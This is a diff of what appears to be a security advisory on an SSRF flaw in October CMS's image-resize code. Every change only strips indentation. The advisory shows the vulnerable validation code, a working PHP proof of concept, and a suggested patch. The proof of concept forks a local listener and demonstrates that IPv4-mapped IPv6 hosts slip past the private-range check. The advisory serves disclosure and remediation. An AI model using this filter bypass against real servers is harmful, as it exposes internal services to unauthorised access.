@@ -17,49 +17,49 @@ The image resize system accepts image paths through `ResizeImages::resize()`, wh
 // modules/system/classes/ResizeImages.php:265-310
 protected function validateExternalImageHost(string $url): bool
 {
-    $parts = parse_url($url);
-    if (!$parts || !isset($parts['scheme'], $parts['host'])) {
-        return false;
-    }
+ $parts = parse_url($url);
+ if (!$parts || !isset($parts['scheme'], $parts['host'])) {
+ return false;
+ }
 
-    if (!in_array(strtolower($parts['scheme']), ['http', 'https'], true)) {
-        return false;
-    }
+ if (!in_array(strtolower($parts['scheme']), ['http', 'https'], true)) {
+ return false;
+ }
 
-    // parse_url returns IPv6 literals wrapped in brackets, e.g. [::1]
-    $host = trim($parts['host'], '[]');
+ // parse_url returns IPv6 literals wrapped in brackets, e.g. [::1]
+ $host = trim($parts['host'], '[]');
 
-    // Resolve host to IP addresses and reject any that fall in a reserved range.
-    $ips = [];
-    if (filter_var($host, FILTER_VALIDATE_IP)) {
-        // Host is already an IP literal
-        $ips[] = $host;
-    }
-    else {
-        $records = @dns_get_record($host, DNS_A | DNS_AAAA);
-        if (is_array($records)) {
-            foreach ($records as $record) {
-                $ips[] = $record['ip'] ?? $record['ipv6'] ?? null;
-            }
-        }
-    }
+ // Resolve host to IP addresses and reject any that fall in a reserved range.
+ $ips = [];
+ if (filter_var($host, FILTER_VALIDATE_IP)) {
+ // Host is already an IP literal
+ $ips[] = $host;
+ }
+ else {
+ $records = @dns_get_record($host, DNS_A | DNS_AAAA);
+ if (is_array($records)) {
+ foreach ($records as $record) {
+ $ips[] = $record['ip'] ?? $record['ipv6'] ?? null;
+ }
+ }
+ }
 
-    $ips = array_filter($ips);
-    if (empty($ips)) {
-        return false;
-    }
+ $ips = array_filter($ips);
+ if (empty($ips)) {
+ return false;
+ }
 
-    foreach ($ips as $ip) {
-        if (!filter_var(
-            $ip,
-            FILTER_VALIDATE_IP,
-            FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE
-        )) {
-            return false;
-        }
-    }
+ foreach ($ips as $ip) {
+ if (!filter_var(
+ $ip,
+ FILTER_VALIDATE_IP,
+ FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE
+ )) {
+ return false;
+ }
+ }
 
-    return true;
+ return true;
 }
 ```
 
@@ -81,23 +81,23 @@ The vulnerable fetch executes in `getSourcePathForResize()`. When both `validate
 // modules/system/classes/ResizeImages.php:189-220
 protected function getSourcePathForResize($realSourcePath, $tempSourcePath)
 {
-    $isExternal = strpos($realSourcePath, 'http') === 0;
-    $sourcePath = $isExternal ? $tempSourcePath : $realSourcePath;
+ $isExternal = strpos($realSourcePath, 'http') === 0;
+ $sourcePath = $isExternal ? $tempSourcePath : $realSourcePath;
 
-    if ($isExternal) {
-        if (!$this->validateExternalImageUrl($realSourcePath)) { ... }
-        elseif (!$this->validateExternalImageHost($realSourcePath)) { ... }
-        else {
-            $contents = @file_get_contents($realSourcePath, false, stream_context_create([
-                'http' => ['timeout' => 5, 'follow_location' => 0],
-            ]));
+ if ($isExternal) {
+ if (!$this->validateExternalImageUrl($realSourcePath)) { ... }
+ elseif (!$this->validateExternalImageHost($realSourcePath)) { ... }
+ else {
+ $contents = @file_get_contents($realSourcePath, false, stream_context_create([
+ 'http' => ['timeout' => 5, 'follow_location' => 0],
+ ]));
 
-            if ($this->validateImageContents($contents)) {
-                file_put_contents($tempSourcePath, $contents);
-            }
-        }
-    }
-    ...
+ if ($this->validateImageContents($contents)) {
+ file_put_contents($tempSourcePath, $contents);
+ }
+ }
+ }
+ ...
 }
 ```
 
@@ -146,12 +146,12 @@ The following PoC uses the **real October CMS source logic verbatim** — the ac
  * October CMS SSRF — PoC using the REAL ResizeImages.php source logic
  *
  * Source: octobercms/october @ develop (commit c1876c7), v4.3.4
- * File:   modules/system/classes/ResizeImages.php
+ * File: modules/system/classes/ResizeImages.php
  *
  * This PoC extracts the three real methods verbatim:
- *   - validateExternalImageUrl()  (lines 243-258)
- *   - validateExternalImageHost() (lines 265-310)
- *   - getSourcePathForResize()    (lines 189-220, the if/elseif/else chain)
+ * - validateExternalImageUrl() (lines 243-258)
+ * - validateExternalImageHost() (lines 265-310)
+ * - getSourcePathForResize() (lines 189-220, the if/elseif/else chain)
  *
  * and runs an actual attack URL through the full parse_url -> trim -> filter_var
  * -> file_get_contents chain, against a live local HTTP listener.
@@ -160,78 +160,78 @@ The following PoC uses the **real October CMS source logic verbatim** — the ac
 /* ====================================================================
  * REAL October CMS code — copied verbatim from ResizeImages.php
  * (FileDefinitions::get('image_extensions') replaced with the default
- *  array it returns; Log::warning replaced with echoes)
+ * array it returns; Log::warning replaced with echoes)
  * ==================================================================== */
 
 function validateExternalImageUrl(string $url): bool
 {
-    $path = parse_url($url, PHP_URL_PATH);
-    if (!$path) {
-        return false;
-    }
+ $path = parse_url($url, PHP_URL_PATH);
+ if (!$path) {
+ return false;
+ }
 
-    $extension = strtolower(pathinfo($path, PATHINFO_EXTENSION));
-    if (!$extension) {
-        return false;
-    }
+ $extension = strtolower(pathinfo($path, PATHINFO_EXTENSION));
+ if (!$extension) {
+ return false;
+ }
 
-    // October CMS default image extensions (FileDefinitions::get('image_extensions'))
-    $allowedExtensions = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'svg', 'bmp', 'ico', 'tiff'];
+ // October CMS default image extensions (FileDefinitions::get('image_extensions'))
+ $allowedExtensions = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'svg', 'bmp', 'ico', 'tiff'];
 
-    return in_array($extension, $allowedExtensions);
+ return in_array($extension, $allowedExtensions);
 }
 
 function validateExternalImageHost(string $url): bool
 {
-    $parts = parse_url($url);
-    if (!$parts || !isset($parts['scheme'], $parts['host'])) {
-        return false;
-    }
+ $parts = parse_url($url);
+ if (!$parts || !isset($parts['scheme'], $parts['host'])) {
+ return false;
+ }
 
-    if (!in_array(strtolower($parts['scheme']), ['http', 'https'], true)) {
-        return false;
-    }
+ if (!in_array(strtolower($parts['scheme']), ['http', 'https'], true)) {
+ return false;
+ }
 
-    // parse_url returns IPv6 literals wrapped in brackets, e.g. [::1]
-    $host = trim($parts['host'], '[]');
+ // parse_url returns IPv6 literals wrapped in brackets, e.g. [::1]
+ $host = trim($parts['host'], '[]');
 
-    // Resolve host to IP addresses and reject any that fall in a reserved range.
-    $ips = [];
-    if (filter_var($host, FILTER_VALIDATE_IP)) {
-        $ips[] = $host;
-    }
-    else {
-        $records = @dns_get_record($host, DNS_A | DNS_AAAA);
-        if (is_array($records)) {
-            foreach ($records as $record) {
-                $ips[] = $record['ip'] ?? $record['ipv6'] ?? null;
-            }
-        }
-    }
+ // Resolve host to IP addresses and reject any that fall in a reserved range.
+ $ips = [];
+ if (filter_var($host, FILTER_VALIDATE_IP)) {
+ $ips[] = $host;
+ }
+ else {
+ $records = @dns_get_record($host, DNS_A | DNS_AAAA);
+ if (is_array($records)) {
+ foreach ($records as $record) {
+ $ips[] = $record['ip'] ?? $record['ipv6'] ?? null;
+ }
+ }
+ }
 
-    $ips = array_filter($ips);
-    if (empty($ips)) {
-        return false;
-    }
+ $ips = array_filter($ips);
+ if (empty($ips)) {
+ return false;
+ }
 
-    foreach ($ips as $ip) {
-        if (!filter_var(
-            $ip,
-            FILTER_VALIDATE_IP,
-            FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE
-        )) {
-            return false;
-        }
-    }
+ foreach ($ips as $ip) {
+ if (!filter_var(
+ $ip,
+ FILTER_VALIDATE_IP,
+ FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE
+ )) {
+ return false;
+ }
+ }
 
-    return true;
+ return true;
 }
 
 /* ====================================================================
  * End-to-end test against a live local listener
  * ==================================================================== */
 
-$port    = 18080;
+$port = 18080;
 $logFile = sys_get_temp_dir() . '/ssrf_realcode_hit.log';
 @unlink($logFile);
 
@@ -243,24 +243,24 @@ $pid = pcntl_fork();
 if ($pid === -1) { die("[-] pcntl_fork failed\n"); }
 
 if ($pid === 0) {
-    $srv = @stream_socket_server("tcp://127.0.0.1:$port", $errno, $errstr);
-    if (!$srv) { exit("[-] listen failed: $errstr\n"); }
-    $deadline = time() + 15;
-    while (time() < $deadline) {
-        $client = @stream_socket_accept($srv, 1);
-        if (!$client) continue;
-        $req     = fread($client, 4096);
-        $reqLine = trim(strtok($req, "\n"));
-        $remote  = stream_socket_get_name($client, true);
-        file_put_contents($logFile,
-            date('H:i:s') . " | $reqLine | RemoteAddr=$remote\n", FILE_APPEND);
-        $body = 'INTERNAL-SERVICE-RESPONSE';
-        fwrite($client,
-            "HTTP/1.1 200 OK\r\nContent-Type: image/jpeg\r\n" .
-            "Content-Length: " . strlen($body) . "\r\nConnection: close\r\n\r\n" . $body);
-        fclose($client);
-    }
-    exit(0);
+ $srv = @stream_socket_server("tcp://127.0.0.1:$port", $errno, $errstr);
+ if (!$srv) { exit("[-] listen failed: $errstr\n"); }
+ $deadline = time() + 15;
+ while (time() < $deadline) {
+ $client = @stream_socket_accept($srv, 1);
+ if (!$client) continue;
+ $req = fread($client, 4096);
+ $reqLine = trim(strtok($req, "\n"));
+ $remote = stream_socket_get_name($client, true);
+ file_put_contents($logFile,
+ date('H:i:s') . " | $reqLine | RemoteAddr=$remote\n", FILE_APPEND);
+ $body = 'INTERNAL-SERVICE-RESPONSE';
+ fwrite($client,
+ "HTTP/1.1 200 OK\r\nContent-Type: image/jpeg\r\n" .
+ "Content-Length: " . strlen($body) . "\r\nConnection: close\r\n\r\n" . $body);
+ fclose($client);
+ }
+ exit(0);
 }
 
 usleep(400000); // let the listener bind
@@ -276,49 +276,49 @@ echo str_repeat('-', 66) . "\n";
 $parts = parse_url($attackUrl);
 $rawHost = $parts['host'];
 $host = trim($parts['host'], '[]');
-printf("  parse_url host field : %s\n", $rawHost);
-printf("  after trim('[]')     : %s\n", $host);
-printf("  filter_var is IP?    : %s\n", filter_var($host, FILTER_VALIDATE_IP) ? 'YES (treated as IP literal)' : 'no');
-printf("  NO_PRIV|NO_RES check : %s\n",
-    filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)
-        ? 'PASS (allowed through!)' : 'BLOCKED');
+printf(" parse_url host field : %s\n", $rawHost);
+printf(" after trim('[]') : %s\n", $host);
+printf(" filter_var is IP? : %s\n", filter_var($host, FILTER_VALIDATE_IP) ? 'YES (treated as IP literal)' : 'no');
+printf(" NO_PRIV|NO_RES check : %s\n",
+ filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)
+ ? 'PASS (allowed through!)' : 'BLOCKED');
 $hostResult = validateExternalImageHost($attackUrl);
-printf("  validateExternalImageHost() => %s\n", $hostResult ? 'true (PASSED)' : 'false');
+printf(" validateExternalImageHost() => %s\n", $hostResult ? 'true (PASSED)' : 'false');
 
 /* [2] validateExternalImageUrl */
 echo "\n[2] validateExternalImageUrl()\n";
 echo str_repeat('-', 66) . "\n";
 $urlResult = validateExternalImageUrl($attackUrl);
-printf("  validateExternalImageUrl() => %s\n", $urlResult ? 'true (PASSED)' : 'false');
+printf(" validateExternalImageUrl() => %s\n", $urlResult ? 'true (PASSED)' : 'false');
 
 /* [3] getSourcePathForResize if/elseif/else chain → file_get_contents */
 echo "\n[3] getSourcePathForResize() decision chain (real logic)\n";
 echo str_repeat('-', 66) . "\n";
 if (!$urlResult) {
-    echo "  => Log::warning (blocked: invalid extension) — NOT FETCHED\n";
+ echo " => Log::warning (blocked: invalid extension) — NOT FETCHED\n";
 } elseif (!$hostResult) {
-    echo "  => Log::warning (blocked: disallowed host) — NOT FETCHED\n";
+ echo " => Log::warning (blocked: disallowed host) — NOT FETCHED\n";
 } else {
-    echo "  => Both checks PASSED — entering else branch, calling file_get_contents()...\n";
-    $contents = @file_get_contents($attackUrl, false, stream_context_create([
-        'http' => ['timeout' => 5, 'follow_location' => 0],
-    ]));
-    if ($contents === false) {
-        $e = error_get_last();
-        echo "  => file_get_contents FAILED: " . $e['message'] . "\n";
-    } else {
-        echo "  => file_get_contents CONNECTED, received: \"$contents\"\n";
-        echo "  => SSRF CONFIRMED via real CMS code path\n";
-    }
+ echo " => Both checks PASSED — entering else branch, calling file_get_contents()...\n";
+ $contents = @file_get_contents($attackUrl, false, stream_context_create([
+ 'http' => ['timeout' => 5, 'follow_location' => 0],
+ ]));
+ if ($contents === false) {
+ $e = error_get_last();
+ echo " => file_get_contents FAILED: " . $e['message'] . "\n";
+ } else {
+ echo " => file_get_contents CONNECTED, received: \"$contents\"\n";
+ echo " => SSRF CONFIRMED via real CMS code path\n";
+ }
 }
 
 /* [4] Listener log */
 echo "\n[4] Internal listener request log (proves server-side access)\n";
 echo str_repeat('-', 66) . "\n";
-echo file_exists($logFile) ? file_get_contents($logFile) : "  (no requests received)\n";
+echo file_exists($logFile) ? file_get_contents($logFile) : " (no requests received)\n";
 
 echo "[*] Conclusion: the real ResizeImages.php code path (parse_url -> trim ->\n";
-echo "    filter_var -> file_get_contents) connects to the mapped internal address.\n";
+echo " filter_var -> file_get_contents) connects to the mapped internal address.\n";
 
 posix_kill($pid, 9);
 pcntl_wait($status);
@@ -354,22 +354,22 @@ Normalize IPv4-mapped IPv6 addresses before applying `filter_var()` checks, so t
 ```php
 protected function validateExternalImageHost(string $url): bool
 {
-    $parts = parse_url($url);
-    if (!$parts || !isset($parts['scheme'], $parts['host'])) {
-        return false;
-    }
+ $parts = parse_url($url);
+ if (!$parts || !isset($parts['scheme'], $parts['host'])) {
+ return false;
+ }
 
-    $host = trim($parts['host'], '[]');
+ $host = trim($parts['host'], '[]');
 
-    // Reject IPv4-mapped IPv6 addresses: ::ffff:A.B.C.D
-    if (str_starts_with(strtolower($host), '::ffff:')) {
-        $mappedV4 = substr($host, 7);
-        if (filter_var($mappedV4, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
-            $host = $mappedV4;
-        }
-    }
+ // Reject IPv4-mapped IPv6 addresses: ::ffff:A.B.C.D
+ if (str_starts_with(strtolower($host), '::ffff:')) {
+ $mappedV4 = substr($host, 7);
+ if (filter_var($mappedV4, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
+ $host = $mappedV4;
+ }
+ }
 
-    // ... existing checks ...
+ // ... existing checks ...
 }
 ```
 
